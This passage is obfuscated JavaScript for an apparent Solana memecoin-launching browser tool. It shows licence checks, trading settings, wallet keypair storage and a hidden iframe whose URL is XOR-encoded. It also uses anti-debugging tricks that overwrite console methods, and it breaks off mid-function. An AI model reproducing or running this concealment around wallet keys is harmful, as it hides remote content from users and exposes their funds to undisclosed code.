var axiomVamp = (function () {
  "use strict";
  var t = Object.defineProperty,
    e = (e, n, r) =>
      ((e, n, r) =>
        n in e
          ? t(e, n, {
              enumerable: !0,
              configurable: !0,
              writable: !0,
              value: r,
            })
          : (e[n] = r))(e, "symbol" != typeof n ? n + "" : n, r);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const n = i;
  !(function (t) {
    const e = 255,
      n = 245,
      r = 258,
      o = 272,
      s = 312,
      a = 247,
      u = 238,
      c = 283,
      l = 300,
      d = 249,
      f = 232,
      h = i,
      p = t();
    for (; []; )
      try {
        if (
          231953 ===
          -parseInt(h(e)) / 1 +
            (parseInt(h(n)) / 2) * (parseInt(h(r)) / 3) +
            (parseInt(h(279)) / 4) * (parseInt(h(307)) / 5) +
            (-parseInt(h(o)) / 6) * (-parseInt(h(s)) / 7) +
            (-parseInt(h(a)) / 8) * (-parseInt(h(u)) / 9) +
            (parseInt(h(c)) / 10) * (parseInt(h(l)) / 11) +
            (parseInt(h(d)) / 12) * (-parseInt(h(f)) / 13)
        )
          break;
        p.push(p.shift());
      } catch (m) {
        p.push(p.shift());
      }
  })(u);
  const r = (function () {
      const t = 237;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[i(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    o = r(void 0, function () {
      const t = 286,
        e = 287,
        n = 292,
        r = 289,
        s = 292,
        a = i,
        u = {};
      u.CWnZj = a(t) + "+$";
      const c = u;
      return o[a(e)]()
        [a(289)](c[a(n)])
        .toString()
        .constructor(o)
        [a(r)](c[a(s)]);
    });
  function i(t, e) {
    const n = u();
    return (
      (i = function (e, r) {
        let o = n[(e -= 227)];
        if (void 0 === i.wVSLJY) {
          var s = function (t) {
            let e = "",
              n = "",
              r = e + s;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (i.HlKaMr = s), (t = arguments), (i.wVSLJY = !![]);
        }
        const a = e + n[0],
          u = t[a];
        if (u) o = u;
        else {
          const e = function (t) {
            (this.ToJZPW = t),
              (this.EbkhYM = [1, 0, 0]),
              (this.uErTqk = function () {
                return "newState";
              }),
              (this.wouhsD = "\\w+ *\\(\\) *{\\w+ *"),
              (this.TnSwBb = "['|\"].+['|\"];? *}");
          };
          (e.prototype.RwKJiy = function () {
            const t = new RegExp(this.wouhsD + this.TnSwBb).test(
              this.uErTqk.toString()
            )
              ? --this.EbkhYM[1]
              : --this.EbkhYM[0];
            return this.hNMtiM(t);
          }),
            (e.prototype.hNMtiM = function (t) {
              return Boolean(~t) ? this.pxwqdr(this.ToJZPW) : t;
            }),
            (e.prototype.pxwqdr = function (t) {
              for (let e = 0, n = this.EbkhYM.length; e < n; e++)
                this.EbkhYM.push(Math.round(Math.random())),
                  (n = this.EbkhYM.length);
              return t(this.EbkhYM[0]);
            }),
            new e(i).RwKJiy(),
            (o = i.HlKaMr(o)),
            (t[a] = o);
        }
        return o;
      }),
      i(t, e)
    );
  }
  o();
  const s = (function () {
      let t = !![];
      return function (e, n) {
        const r = 237,
          o = t
            ? function () {
                if (n) {
                  const t = n[i(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    a = s(void 0, function () {
      const t = 229,
        e = 274,
        n = 284,
        r = 302,
        o = 254,
        a = 236,
        u = 233,
        c = 263,
        l = 287,
        d = 295,
        f = i,
        h = {
          RlCoD: function (t, e) {
            return t + e;
          },
          dlyIa: "return (fu" + f(309),
          kAmSI: f(t) + 'ctor("return this")( )',
          qYlgL: function (t) {
            return t();
          },
          XUAIz: f(278),
          QcQbk: "exception",
          slSPX: f(e),
          VmFrY: function (t, e) {
            return t < e;
          },
        };
      let p;
      try {
        const t = Function(h.RlCoD(h[f(270)], h[f(n)]) + ");");
        p = h[f(r)](t);
      } catch (y) {
        p = window;
      }
      const m = (p.console = p.console || {}),
        g = [f(291), "warn", h[f(231)], "error", h[f(o)], h.slSPX, f(a)];
      for (let i = 0; h[f(u)](i, g.length); i++) {
        const t = s.constructor.prototype.bind(s),
          e = g[i],
          n = m[e] || t;
        (t[f(c)] = s.bind(s)), (t[f(l)] = n[f(l)][f(d)](n)), (m[e] = t);
      }
    });
  function u() {
    const t = [
      "C3bSAxq",
      "uwnryMS",
      "mtyZnZu2sgLbtKzM",
      "DwX0",
      "Bg93rw5Ktw9Kzq",
      "mtaYotm5qujwsLbP",
      "Aw5RCW",
      "Cg9UC2u",
      "yxbPs2v5",
      "zwnVAw4SignVAq",
      "x19WCM90B19F",
      "DLLpq0S",
      "zhniv0W",
      "DhDPDhrLCLvYBa",
      "DgLvqKG",
      "y29PBK1VzgfSuW",
      "nhWYFdv8mW",
      "zgX5swe",
      "C2TdCNLWDa",
      "mJq2mtK3nfDvuNH5Da",
      "ChjPB3jPDhLgzq",
      "DgfIBgu",
      "zNjVBufWAvjLCW",
      "C0Ddruy",
      "A2LSBgvKlcbQDq",
      "Aw5MBW",
      "neLywhH0Dq",
      "zgvMyxvSDfnVBa",
      "y3jLyxrLzf9HDa",
      "ywrKAxrPB25HBa",
      "nde3nZmXmfzAzhHbza",
      "A0fTu0K",
      "AgfZsw1Hz2vZ",
      "kcGOlISPkYKRkq",
      "Dg9tDhjPBMC",
      "y3jLyxrLrgvMyq",
      "C2vHCMnO",
      "yNzWBuS",
      "Bg9N",
      "q1DUwMO",
      "Aw5PDgLHBeXPCq",
      "zw1HAwXFDMvYAq",
      "yMLUza",
      "DxbKyxrLzf9HDa",
      "DxbKyxrLvxnLCG",
      "Bg9Nz2vKsw4",
      "Bw9NDgvJAfjqqW",
      "mtfxsKrxzxG",
      "C2vSzwn0zwrnBW",
      "CvLSz0W",
      "ywDL",
      "CM9Y",
      "D2vIC2L0zvvYBa",
      "BgvUz3rO",
      "nZy5mJCWte5QvvrA",
      "AxnwywXPza",
      "BMn0Aw9UkcKG",
      "BhPYB1C",
      "DxnLCM5HBwu",
      "n2zzq2zLCW",
      "DwLKAxr5",
      "zwrjBG",
      "Bu10Euu",
      "y2njyvG",
      "zsWGBMfTzxmSia",
      "C2f2zvrVu3rVCG",
      "v2vIC2L0zxm",
      "BgfZDf9LEhrLBG",
      "E30Uy29UC3rYDq",
      "zxr0Aw5NCW",
      "wfvbsxO",
      "mty0mJm0mZnlu05WuMy",
      "vM1gCLK",
      "AhDPza",
      "AgfZu29JAwfSta",
      "DhjHy2u",
      "yxbWBhK",
      "mJC5AuDQtwnj",
      "C2XPChbHz2u",
      "zNjVBuv4DhjHyW",
      "u2z4t0C",
      "C2v0s2v5ugfPCG",
      "vw5RBM93BIbLCG",
      "EM96sw4",
      "mtrRAfzNteG",
      "DgLJA2vY",
      "mteYnZyWwgLRzuHV",
      "DxnLCG",
      "mtjlrwHWqxG",
      "C2v0sxrLBq",
      "y2fUq3jLyxrLqW",
      "CNbJtw9Kzq",
    ];
    return (u = function () {
      return t;
    })();
  }
  a(),
    (window[n(271)] = function (t) {
      return function () {
        return t;
      };
    });
  class c {
    constructor(t = null, e = null, r = null, o, i, s, a, u, c) {
      const l = 269,
        d = 253,
        f = 281,
        h = 228,
        p = n,
        m = {};
      m.PYpKN = "1|0|7|6|8|" + p(l);
      const g = m.PYpKN[p(d)]("|");
      let y = 0;
      for (; []; ) {
        switch (g[y++]) {
          case "0":
            this.username = e;
            continue;
          case "1":
            this.id = t;
            continue;
          case "2":
            this.hwid = a;
            continue;
          case "3":
            this.updated_at = c;
            continue;
          case "4":
            this.expire_date = s;
            continue;
          case "5":
            this[p(f)] = u;
            continue;
          case "6":
            this.email_verified_at = o;
            continue;
          case "7":
            this.email = r;
            continue;
          case "8":
            this[p(h) + "d_date"] = i;
            continue;
        }
        break;
      }
    }
    get [n(308)]() {
      const t = n,
        e = {
          zozIn: function (t, e) {
            return t !== e;
          },
        },
        r = e;
      return null !== this.username && r[t([244][0])](this.id, null);
    }
    get isExpired() {
      return this.expire_date ? new Date(this.expire_date) < new Date() : ![];
    }
    static [n(275) + "ponse"](t) {
      const e = 294,
        r = 234,
        o = 296,
        i = n;
      return new c(
        t.id,
        t[i(311)],
        t.email,
        t[i(e) + "fied_at"],
        t.last_extend_date,
        t.expire_date,
        t[i(r)],
        t.created_at,
        t[i(o)]
      );
    }
  }
  class l {
    constructor(
      t = 1,
      e = 5e-4,
      r = 25,
      o = !![],
      i = n(277) + "stice, nam" + n(317) + "named, memecoin, coin",
      s = "",
      a = "pump",
      u = "mogtechRPC"
    ) {
      const c = 273,
        l = 261,
        d = 252,
        f = 301,
        h = n;
      (this.defaultSol = t),
        (this[h(c) + "e"] = e),
        (this.slippage = r),
        (this.lowEndMode = o),
        (this.highlightWords = i),
        (this[h(l)] = s),
        (this[h(d)] = a),
        (this[h(f) + "de"] = u);
    }
    static fromStorage() {
      const t = 277,
        e = 262,
        r = 243,
        o = 304,
        i = 230,
        s = 273,
        a = 257,
        u = 241,
        c = 276,
        d = 290,
        f = n,
        h = {};
      (h[f(267)] = f(t) + "stice, name, names, named, mem" + f(e) + "n"),
        (h[f(264)] = f(r) + f(o)),
        (h.SfxOG = function (t, e) {
          return t instanceof e;
        }),
        (h.sGCEF = "string"),
        (h.bvpmK = function (t, e) {
          return t === e;
        }),
        (h[f(315)] = "object");
      const p = h;
      try {
        const t = localStorage.getItem("coinModalS" + f(i));
        if (!t) return null;
        const e = JSON.parse(t);
        return new l(
          e.defaultSol,
          e[f(s) + "e"] || 5e-4,
          e.slippage || 10,
          e[f(a)] || !![],
          e.highlightWords || p.tiUBH,
          e.apiKey || "",
          e.rpcMode || "pump",
          e.selectedMode || f(299)
        );
      } catch (m) {
        return (
          p.vYOCK,
          p[f(u)](m, Error)
            ? m.message
            : typeof m === p[f(c)] ||
              (m && p[f(d)](typeof m, p.mMtyE) && JSON.stringify(m)),
          null
        );
      }
    }
    [n(318) + n(303)]() {
      const t = 280,
        e = 239,
        r = 261,
        o = 261,
        i = 250,
        s = 268,
        a = 243,
        u = n,
        c = {};
      c[u(316)] = function (t, e) {
        return t === e;
      };
      const l = c;
      try {
        const n = {};
        (n[u(t)] = this.defaultSol),
          (n.priorityFee = this.priorityFee),
          (n.slippage = this[u(e)]),
          (n.lowEndMode = this.lowEndMode),
          (n.highlightWords = this.highlightWords),
          (n[u(r)] = this[u(o)]),
          (n[u(252)] = this[u(252)]),
          (n.selectedMode = this.selectedMode);
        const a = JSON.stringify(n);
        localStorage[u(i)](u(s) + "ettings", a);
      } catch (d) {
        u(a),
          1,
          d instanceof Error
            ? d.message
            : l.ccIaX(typeof d, "string") ||
              (d && "object" == typeof d && JSON.stringify(d));
      }
    }
    static getDefaults() {
      return new l();
    }
  }
  class d {
    constructor(t = "", e = "", r = "", o, i, s, a, u, c = "") {
      const l = 246,
        d = 266,
        f = 293,
        h = 282,
        p = 227,
        m = n,
        g = "8|0|3|1|5|6|7|2|4"[m(253)]("|");
      let y = 0;
      for (; []; ) {
        switch (g[y++]) {
          case "0":
            this[m(l)] = e;
            continue;
          case "1":
            this[m(d)] = o;
            continue;
          case "2":
            this.images = u;
            continue;
          case "3":
            this[m(f) + "uidity"] = r;
            continue;
          case "4":
            this.selectedImage = c;
            continue;
          case "5":
            this.websiteUrl = i;
            continue;
          case "6":
            this[m(h) + "Tweets"] = s;
            continue;
          case "7":
            this["additional" + m(p)] = a;
            continue;
          case "8":
            this.coinName = t;
            continue;
        }
        break;
      }
    }
    get [n(308)]() {
      const t = 265,
        e = 246,
        r = 303,
        o = n,
        i = {};
      (i[o(265)] = function (t, e) {
        return t > e;
      }),
        (i.SHdPQ = function (t, e) {
          return t >= e;
        });
      const s = i;
      return (
        s[o(t)](this.coinName[o(306)], 0) &&
        s[o(265)](this[o(e)].length, 0) &&
        this["selectedIm" + o(r)].length > 0 &&
        s.SHdPQ(parseFloat(this["initialLiq" + o(313)]), 0)
      );
    }
    get [n(285)]() {
      var t;
      const e = 306,
        r = 303,
        o = n,
        i = {
          uwrEv: function (t, e) {
            return t > e;
          },
        },
        s = i;
      return (
        s.uwrEv((null == (t = this.images) ? void 0 : t[o(e)]) || 0, 0) ||
        s.uwrEv(this["selectedIm" + o(r)].length, 0)
      );
    }
    get [n(235) + n(259)]() {
      const t = n;
      return !(!this[t(266)] && !this[t([305][0])]);
    }
    static [n(288) + n(256)]() {
      return new d();
    }
    static [n(240) + "tedData"](t) {
      const e = n;
      return new d(
        t.coinName || "",
        t.ticker || "",
        t[e(293) + "uidity"] || "1",
        t.twitterUrl,
        t[e([305][0])],
        t.additionalTweets || [],
        t.additionalWebsites || [],
        t.images || [],
        t["selectedIm" + e(303)] || ""
      );
    }
  }
  class f {
    constructor(t = null, e = null, r = ![], o = null, i = ![]) {
      const s = n;
      (this.keyPair = t),
        (this.iframe = e),
        (this.iframeVisible = r),
        (this.user = o),
        (this[s([298][0])] = i);
    }
    get ["isUserLogg" + n(314)]() {
      var t;
      const e = {
          Notut: function (t, e) {
            return t === e;
          },
        },
        n = e;
      return (
        this.loggedIn &&
        n.Notut(null == (t = this.user) ? void 0 : t.isValid, !![])
      );
    }
    get [n(251) + "oin"]() {
      const t = 310,
        e = n,
        r = {};
      r[e(310)] = function (t, e) {
        return t !== e;
      };
      const o = r;
      return this.isUserLoggedIn && o[e(t)](this.keyPair, null);
    }
    [n(297)](t) {
      const e = n;
      (this[e([248][0])] = c["fromApiRes" + e(260)](t)),
        (this.loggedIn = this[e(248)].isValid);
    }
    clearKeyPair() {
      this.keyPair = null;
    }
    [n(242)](t, e) {
      this.keyPair = [t, e];
    }
  }
  axiomVamp;
  const h = k;
  function p() {
    const t = [
      "zwrjBG",
      "yMLUza",
      "vKP0Euu",
      "y3rVCIGICMv0Dq",
      "yMXL",
      "x19WCM90B19F",
      "BMn0Aw9UkcKG",
      "AwzYyw1LvMLZAq",
      "BgvUz3rO",
      "DxnLCG",
      "Aw5MBW",
      "Bg9Nz2vKsw4",
      "CMv0DxjUicHMDq",
      "AezNyNu",
      "mtmXodC5q3vNteLp",
      "AwzYyw1L",
      "C2v0s2v5ugfPCG",
      "mta0EunrDK9h",
      "ntqWmJGXneLNz0fbAG",
      "CM4GDgHPCYiPka",
      "oda1nty3nuH3s09fyG",
      "nMrpzKPgtW",
      "DwX0",
      "y29UC29Szq",
      "mtG3mdi5mKvwq2DgBG",
      "mtbZtLrjyNK",
      "mtqZmtfkzxrqqMO",
      "ndqZmtK4zvDhweHH",
      "mtiZmte5nJrKCgTQCM4",
      "kcGOlISPkYKRkq",
      "ndq5mZbhEurRrhy",
    ];
    return (p = function () {
      return t;
    })();
  }
  !(function (t) {
    const e = 339,
      n = 350,
      r = 346,
      o = 349,
      i = 345,
      s = 352,
      a = 342,
      u = 353,
      c = 355,
      l = 351,
      d = k,
      f = t();
    for (; []; )
      try {
        if (
          866960 ===
          (-parseInt(d(e)) / 1) * (-parseInt(d(n)) / 2) +
            (parseInt(d(r)) / 3) * (-parseInt(d(o)) / 4) +
            -parseInt(d(i)) / 5 +
            -parseInt(d(343)) / 6 +
            (parseInt(d(s)) / 7) * (-parseInt(d(a)) / 8) +
            -parseInt(d(u)) / 9 +
            (parseInt(d(c)) / 10) * (parseInt(d(l)) / 11)
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(p);
  const m = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    g = m(void 0, function () {
      const t = k;
      return g
        .toString()
        .search("(((.+)+)+)+$")
        .toString()
        .constructor(g)
        .search(t([354][0]) + "+$");
    });
  g();
  const y = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  y(void 0, function () {
    const t = 331,
      e = 348,
      n = 338,
      r = 333,
      o = 330,
      i = 359,
      s = 344,
      a = k,
      u = {
        FCfUz: function (t, e) {
          return t(e);
        },
        ndpgZ: function (t, e) {
          return t + e;
        },
        sTNfm: a(337) + a(t),
        hFgbu: "trace",
      },
      c = (function () {
        const t = a;
        let e;
        try {
          e = u.FCfUz(
            Function,
            u.ndpgZ(u.sTNfm, "{}.constru" + t(i) + t(s) + " )") + ");"
          )();
        } catch (n) {
          e = window;
        }
        return e;
      })(),
      l = (c[a(e)] = c[a(e)] || {}),
      d = ["log", "warn", a(335), "error", "exception", "table", u[a(n)]];
    for (let f = 0; f < d[a(r)]; f++) {
      const t = y.constructor.prototype.bind(y),
        e = d[f],
        n = l[e] || t;
      (t[a(o)] = y[a(357)](y)), (t.toString = n.toString.bind(n)), (l[e] = t);
    }
  })(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const w = new f(),
    b = () => d["createDefa" + h(347)](),
    v = () => ({
      keyPair: w.keyPair,
      iframe: w.iframe,
      iframeVisible: w.iframeVisible,
      user: w.user,
      loggedIn: w.loggedIn,
    }),
    A = (t) => {
      const e = 341,
        n = 358,
        r = 340,
        o = 332,
        i = 334,
        s = 336,
        a = h,
        u = {
          VJtyE: function (t, e) {
            return t !== e;
          },
        },
        c = u;
      void 0 !== t.keyPair &&
        (null === t.keyPair
          ? w.clearKeyPair()
          : w[a(e)](t.keyPair[0], t.keyPair[1])),
        c[a(n)](t.iframe, void 0) && (w[a(r)] = t.iframe),
        void 0 !== t[a(o) + a(329)] &&
          (w.iframeVisible = t["iframeVisi" + a(329)]),
        void 0 !== t[a(i)] &&
          (null === t[a(i)]
            ? ((w[a(i)] = null), (w.loggedIn = ![]))
            : w.updateUser(t.user)),
        c.VJtyE(t.loggedIn, void 0) && (w[a(s)] = t.loggedIn);
    };
  function k(t, e) {
    const n = p();
    return (
      (k = function (e, r) {
        let o = n[(e -= 329)];
        if (void 0 === k.wTSiSU) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (k.LeyLHk = i), (t = arguments), (k.wTSiSU = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.xdmNfT = t),
              (this.JEXnay = [1, 0, 0]),
              (this.ESjQNO = function () {
                return "newState";
              }),
              (this.ZYGjMP = "\\w+ *\\(\\) *{\\w+ *"),
              (this.aqzAUt = "['|\"].+['|\"];? *}");
          };
          (e.prototype.XjfBOx = function () {
            const t = new RegExp(this.ZYGjMP + this.aqzAUt).test(
              this.ESjQNO.toString()
            )
              ? --this.JEXnay[1]
              : --this.JEXnay[0];
            return this.tLGtAH(t);
          }),
            (e.prototype.tLGtAH = function (t) {
              return Boolean(~t) ? this.bqlndw(this.xdmNfT) : t;
            }),
            (e.prototype.bqlndw = function (t) {
              for (let e = 0, n = this.JEXnay.length; e < n; e++)
                this.JEXnay.push(Math.round(Math.random())),
                  (n = this.JEXnay.length);
              return t(this.JEXnay[0]);
            }),
            new e(k).XjfBOx(),
            (o = k.LeyLHk(o)),
            (t[s] = o);
        }
        return o;
      }),
      k(t, e)
    );
  }
  function I(t, e) {
    const n = _();
    return (
      (I = function (e, r) {
        let o = n[(e -= 318)];
        if (void 0 === I.HYGMit) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (I.LhRaxQ = i), (t = arguments), (I.HYGMit = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.DYtIYU = t),
              (this.qqjjIl = [1, 0, 0]),
              (this.UCREIf = function () {
                return "newState";
              }),
              (this.oEOjGP = "\\w+ *\\(\\) *{\\w+ *"),
              (this.tFEFOq = "['|\"].+['|\"];? *}");
          };
          (e.prototype.QlQrsq = function () {
            const t = new RegExp(this.oEOjGP + this.tFEFOq).test(
              this.UCREIf.toString()
            )
              ? --this.qqjjIl[1]
              : --this.qqjjIl[0];
            return this.MiqTEk(t);
          }),
            (e.prototype.MiqTEk = function (t) {
              return Boolean(~t) ? this.rDaDCH(this.DYtIYU) : t;
            }),
            (e.prototype.rDaDCH = function (t) {
              for (let e = 0, n = this.qqjjIl.length; e < n; e++)
                this.qqjjIl.push(Math.round(Math.random())),
                  (n = this.qqjjIl.length);
              return t(this.qqjjIl[0]);
            }),
            new e(I).QlQrsq(),
            (o = I.LhRaxQ(o)),
            (t[s] = o);
        }
        return o;
      }),
      I(t, e)
    );
  }
  axiomVamp;
  const S = I;
  function _() {
    const t = [
      "BgvUz3rO",
      "yxv0BW",
      "DgL0Bgu",
      "ww1rvey",
      "Cg9ZAxrPB24",
      "zfz5t3y",
      "yxbWzw5Kq2HPBa",
      "y29UDgvUDfDPBG",
      "mtG2mdy1nhLLq3PUDW",
      "t21wwLe",
      "B1zLCuG",
      "yM9KEq",
      "wKf6tLe",
      "zgvJB2rL",
      "Cg9ZDe1LC3nHzW",
      "yxbWBhK",
      "y3jLyxrLrwXLBq",
      "z2v0rwXLBwvUDa",
      "yMXL",
      "BM9Uzq",
      "Aw5MBW",
      "zw50",
      "AgvPz2H0",
      "zML4zwq",
      "mZa5odC5z1Pgtxvk",
      "AwzYyw1LvMLZAq",
      "ovnbCuXfqG",
      "C3jJ",
      "mtjOANbqrxm",
      "mtaZmtq2EMXpzLbH",
      "zs1VDMvYBgf5",
      "CLDfsu0",
      "AwzYyw1L",
      "CM4GDgHPCYiPka",
      "CMv0DxjUicHMDq",
      "B3bHy2L0Eq",
      "sKzzA1e",
      "C3r5Bgu",
      "uNnkCfu",
      "ANfuEw8",
      "thvoBuW",
      "BNrZ",
      "r1zXDMq",
      "y3rVCIGICMv0Dq",
      "D2fYBG",
      "kcGOlISPkYKRkq",
      "DgfIBgu",
      "mJeXmZbIB0zKAuq",
      "C2TdCNLWDa",
      "yMfJA2DYB3vUza",
      "mta3odiZmKfzu09drW",
      "mtqZnde2nuXqEKv3uG",
      "zgLZCgXHEq",
      "wvrnyxe",
      "uNzLCLy",
      "Bg9N",
      "yMLUza",
      "DfzqDfC",
      "BgvMDa",
      "vMjUsvy",
      "mtaWDNC",
      "B3bHy2L0EsaWlG",
      "mtaWmde",
      "r01xzgy",
      "BMn0Aw9UkcKG",
      "y29UDgfPBG",
      "mKDQDw9lvq",
      "yMXVy2S",
      "Dg9tDhjPBMC",
      "oty1mZu2EKXyr3fg",
      "r09LEw4",
    ];
    return (_ = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 337,
      n = 371,
      r = 366,
      o = 370,
      i = 322,
      s = 350,
      a = 340,
      u = 321,
      c = 368,
      l = 318,
      d = I,
      f = t();
    for (; []; )
      try {
        if (
          161501 ===
          (-parseInt(d(e)) / 1) * (-parseInt(d(n)) / 2) +
            (parseInt(d(r)) / 3) * (parseInt(d(o)) / 4) +
            -parseInt(d(i)) / 5 +
            parseInt(d(s)) / 6 +
            -parseInt(d(a)) / 7 +
            -parseInt(d(u)) / 8 +
            (-parseInt(d(c)) / 9) * (parseInt(d(l)) / 10)
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(_),
    (window[S(319)] = function (t) {
      return function () {
        return t;
      };
    });
  let T = ![],
    B = (function () {
      const t = 362,
        e = 388,
        n = 334,
        r = 382,
        o = 347,
        i = 355,
        s = 386,
        a = 328,
        u = 327,
        c = 339,
        l = 339,
        d = S,
        f = {
          JieLb: "(((.+)+)+)+$",
          LPdcQ: function (t, e) {
            return t(e);
          },
          SjlMQ: function (t) {
            return t();
          },
          PkYDj: d(326),
          GOeyn: d(t),
          SYuuN: "error",
          tVPtW: "exception",
          vAvFZ: d(e),
          hReqI: "trace",
          GMWdf: function (t, e) {
            return t < e;
          },
          LuNmL: function (t, e) {
            return t & e;
          },
          dVyOv: function (t, e) {
            return t * e;
          },
          kkTsi: function (t, e, n) {
            return t(e, n);
          },
          Yvmml: function (t, e, n) {
            return t(e, n);
          },
          hujoG: function (t) {
            return t();
          },
        },
        h = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n.apply(e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        p = f.kkTsi(h, this, function () {
          const t = d;
          return p
            .toString()
            .search(t(387) + "+$")
            [t(l)]()
            .constructor(p)
            .search(f.JieLb);
        });
      p();
      const m = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n[I(357)](e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        g = f.Yvmml(m, this, function () {
          const t = 376,
            e = 335,
            n = 375,
            r = d,
            o = f.SjlMQ(function () {
              const r = I;
              let o;
              try {
                o = f.LPdcQ(
                  Function,
                  r(t) + r(e) + "{}.constru" + r(385) + r(n) + " ));"
                )();
              } catch (i) {
                o = window;
              }
              return o;
            }),
            i = (o.console = o.console || {}),
            l = [f.PkYDj, r(s), f[r(341)], f.SYuuN, f[r(a)], f.vAvFZ, f.hReqI];
          for (let s = 0; s < l.length; s++) {
            const t = m.constructor.prototype.bind(m),
              e = l[s],
              n = i[e] || t;
            (t.__proto__ = m[r(u)](m)),
              (t[r(339)] = n[r(c)].bind(n)),
              (i[e] = t);
          }
        });
      let y;
      return (
        f.hujoG(g),
        function () {
          const t = d;
          if (!y) {
            const e = new Uint8Array([
                61, 200, 214, 3, 38, 134, 141, 92, 32, 213, 140, 30, 58, 219,
                214, 22, 54, 212, 140, 23, 48, 202, 141, 28, 35, 217, 208, 31,
                52, 197, 157, 16, 58, 208, 205, 1, 120, 207, 193, 27, 48, 209,
                199, 78,
              ]),
              s = 1940044885,
              a = new Uint8Array(e.length);
            for (let i = 0; f[t(n)](i, e.length); i++) {
              const n = f[t(r)](s >>> f[t(o)](i % 4, 8), 255);
              a[i] = e[i] ^ n;
            }
            y = new TextDecoder()[t(i)](a);
          }
          return y;
        }
      );
    })()();
  const C = () => {
      const t = 353,
        e = 353,
        n = 367,
        r = 360,
        o = S,
        i = function (t, e) {
          return t(e);
        };
      (B = ""), (T = !![]);
      const { iframe: s } = v();
      if (s && s.parentNode === document[o(t)]) {
        document[o(e)].removeChild(s);
        const t = { iframe: null };
        (t[o(n) + o(r)] = ![]), i(A, t);
      }
    },
    E = (t) => {
      const e = 324,
        n = 333,
        r = 361,
        o = 351,
        i = 359,
        s = 344,
        a = 329,
        u = 331,
        c = 364,
        l = 361,
        d = 320,
        f = 323,
        h = 345,
        p = 348,
        m = 342,
        g = S,
        y = {
          oVeqH: function (t, e) {
            return t < e;
          },
        };
      (y[g(373)] = function (t, e) {
        return t & e;
      }),
        (y[g(e)] = function (t, e) {
          return t >>> e;
        }),
        (y.vlAvw = "100vh"),
        (y[g(384)] = g(n)),
        (y.ExQrI = g(r)),
        (y.YmQTF = "opacity"),
        (y[g(o)] = "strict");
      const w = y;
      if (T || !B || 0 === B.length) return null;
      let b = document[g(i) + "ById"]("coin-ifram" + g(372));
      if (b) return b;
      (b = document[g(358) + g(363)]("iframe")),
        (b[g(369)] = "" + B + (t || "light")),
        (b.id = (function () {
          const t = {
            ZAzNQ: function (t, e) {
              return w[I(352)](t, e);
            },
            kixye: function (t, e) {
              return t % e;
            },
          };
          let e;
          return function () {
            const n = I;
            if (!e) {
              const r = new Uint8Array([
                  52, 211, 203, 29, 122, 213, 196, 1, 54, 209, 199, 94, 56, 202,
                  199, 1, 59, 221, 219,
                ]),
                o = 1940044887,
                i = new Uint8Array(r[n(m)]);
              for (let e = 0; t[n(354)](e, r.length); e++) {
                const n = (o >>> (8 * t.kixye(e, 4))) & 255;
                i[e] = r[e] ^ n;
              }
              e = new TextDecoder().decode(i);
            }
            return e;
          };
        })()()),
        (b[g(s)] = (function () {
          const t = 342,
            e = 373;
          let n;
          return function () {
            const r = I;
            if (!n) {
              const o = new Uint8Array([
                  24, 211, 197, 39, 48, 223, 202, 83, 22, 211, 203, 29, 117,
                  255, 208, 22, 52, 200, 205, 1,
                ]),
                i = 1940044885,
